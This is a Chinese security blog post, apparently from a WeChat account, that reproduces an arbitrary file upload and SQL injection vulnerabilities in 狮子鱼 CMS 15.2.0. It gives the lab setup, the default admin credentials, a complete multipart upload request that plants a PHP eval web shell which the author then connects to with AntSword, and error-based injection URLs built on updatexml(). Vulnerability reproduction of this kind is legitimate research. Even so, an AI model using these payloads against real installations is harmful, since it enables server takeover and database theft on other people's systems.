> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kr8SGlvTqcG3pqOqpVKTTg)

漏洞复现
----

<table width="NaN"><thead><tr><th>info</th><th>desc</th></tr></thead><tbody><tr><td height="32">公开日期</td><td height="32">2021-06-08</td></tr><tr><td height="32">危害级别</td><td height="32">高</td></tr><tr><td height="32">影响产品</td><td height="32">狮子鱼 CMS</td></tr><tr><td height="32">漏洞类别</td><td height="32">任意文件上传、SQL 注入</td></tr><tr><td height="32">漏洞类型</td><td height="32">通用型漏洞</td></tr><tr><td height="32">参考链接</td><td height="32">https://www.linuxlz.com/aqld/2251.html</td></tr><tr><td height="32">漏洞 poc</td><td height="32">见下文</td></tr></tbody></table>

环境搭建
----

### 基础环境

*   网站环境：PHPstudy
    
*   狮子鱼 CMS 版本：15.2.0
    
*   源码获取：请在公众号后台回复【狮子鱼】获取压缩包
    

### 安装

*   压缩包解压后，将名为后端的文件夹复制到 PHPstudy 目录下，再将文件夹名改成英文
    

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWrgchWAMVLPCg3tbmib7CkAPx3Jf0pEnKCtqqsXp9JAH6iachOcW5iaT7w/640?wx_fmt=jpeg)

*   新建一个数据库
    

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuW6bBKnKiadcpFriakWdp1n9fLODjR1RTicdXPYjZmyicScjMl9kw5HicKpOQ/640?wx_fmt=jpeg)

点击 MySQL-front 打开 MySQL，新建一个数据库，在数据库中导入 SQL 文件  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWqqfjayZulWg4XExjA8QyW1zOAlQtXxbNHTxicKD0iaaXNI2Ndqr4GkJA/640?wx_fmt=jpeg)

*   修改网站数据配置文件  
    改成英文名的后端文件夹中修改数据库的配置：
    

```
Modules/Common/Conf/db.php
Modules/Seller/Conf/db.php
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWZ0Lyy3uxmicORCCv2EwzqncfOv6ia0fkib5bEuUD09gDonjRhzGicX0ztQ/640?wx_fmt=jpeg)

*   后台管理信息  
    后台地址：域名 / seller.php  
    默认账号：`admin`  
    默认密码：`admin888`
    

### 任意文件上传漏洞

*   漏洞点：  
    `http://******/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php`
    
*   访问，用 burp 抓包，将报文传输方式改成 POST，再将 host 之后的报文内容修改成以下内容，返回包暴露上传路径：
    

```
Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Length: 209

------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; 
Content-Type: image/gif

<?php @eval($_POST[test]);?>
------WebKitFormBoundary8UaANmWAgM4BqBSs—
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWXdicPETpgNIiaAUtvkPheXcxU0Dp7mBhqiaA2fKZ9ia0a2TxHDncnuTxaA/640?wx_fmt=jpeg)

*   使用蚁剑连接 shell 测试，成功连接
    

![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWicNYeT8oz7Ijbticiaj17RjE7pJ0c5TNDAkuhm8SuiadZT5ejmrnogiaZGw/640?wx_fmt=png)

*   另一个任意文件上传漏洞点：  
    `http://********/wxapp.php?controller=Goods.doPageUpload`
    

### SQL 注入漏洞：

*   注入点  
    `http://**********/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)`  
    (报错注入)
    

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWLNJHibBc47MmibaIDaOQ43mjeW1uIPVFC3G4u9XKZwu8phqJlZfJnGbg/640?wx_fmt=jpeg)

*   另一个 SQL 注入漏洞点：  
    `http://**********/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)`
    

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

  

secteam 公众号

  

微信搜索 : secteam

长按识别二维码关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqKticW5ZWC15ibIkiassjrnzm49qKOiccGP2afCSib51VfB83AZYBQ0U09vmYVILSh2dlRXUiaojRYxDX0A/640?wx_fmt=jpeg)